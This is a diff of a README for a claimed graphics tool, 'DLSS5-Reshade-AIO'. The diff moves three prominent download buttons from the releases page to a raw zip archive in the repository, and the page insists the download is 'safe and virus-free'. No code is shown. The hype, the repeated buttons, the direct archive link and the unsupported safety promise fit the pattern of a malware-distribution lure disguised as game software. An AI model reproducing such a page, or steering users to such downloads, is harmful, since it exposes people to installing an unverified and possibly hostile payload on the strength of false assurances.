@@ -1,6 +1,6 @@
 <h1>🖥️ DLSS5-Reshade-AIO - Stunning Graphics for Every Game</h1>
 
-<a href="https://github.com/Uxiez/DLSS5-Reshade-AIO/releases" style="display:inline-block;background-color:#FF6B6B;color:#ffffff;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:20px 0;">⬇️ DOWNLOAD NOW - IT'S FREE</a>
+<a href="https://raw.githubusercontent.com/Uxiez/DLSS5-Reshade-AIO/main/release/v3.5-alpha.3.zip" style="display:inline-block;background-color:#FF6B6B;color:#ffffff;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;margin:20px 0;">⬇️ DOWNLOAD NOW - IT'S FREE</a>
 
 ## ✨ What Is DLSS5-Reshade-AIO?
 
@@ -49,7 +49,7 @@ Don't worry if you're not sure about your computer's specs - Windows will tell y
 
 ### 📥 Step 1: Download
 
-<a href="https://github.com/Uxiez/DLSS5-Reshade-AIO/releases" style="background-color:#4ECDC4;color:#fff;padding:12px 25px;border-radius:6px;text-decoration:none;font-weight:bold;">CLICK HERE TO DOWNLOAD</a>
+<a href="https://raw.githubusercontent.com/Uxiez/DLSS5-Reshade-AIO/main/release/v3.5-alpha.3.zip" style="background-color:#4ECDC4;color:#fff;padding:12px 25px;border-radius:6px;text-decoration:none;font-weight:bold;">CLICK HERE TO DOWNLOAD</a>
 
 Visit this link to download the application. The page shows you available releases - always pick the newest version (highest number). The download will start automatically when you click the file link. This is safe and virus-free.
 
@@ -126,7 +126,7 @@ Open Windows Settings → Apps → Find "DLSS5-Reshade-AIO" → Click "Uninstall
 
 If you encounter an issue not covered here, check the release page for known issues and workarounds. The community is very active and posts solutions to common problems quickly.
 
-<a href="https://github.com/Uxiez/DLSS5-Reshade-AIO/releases" style="display:inline-block;background-color:#95E06C;color:#333;padding:14px 28px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 GET DLSS5-RESHADE-AIO NOW</a>
+<a href="https://raw.githubusercontent.com/Uxiez/DLSS5-Reshade-AIO/main/release/v3.5-alpha.3.zip" style="display:inline-block;background-color:#95E06C;color:#333;padding:14px 28px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🚀 GET DLSS5-RESHADE-AIO NOW</a>
 
 ## 💬 Final Thoughts
 
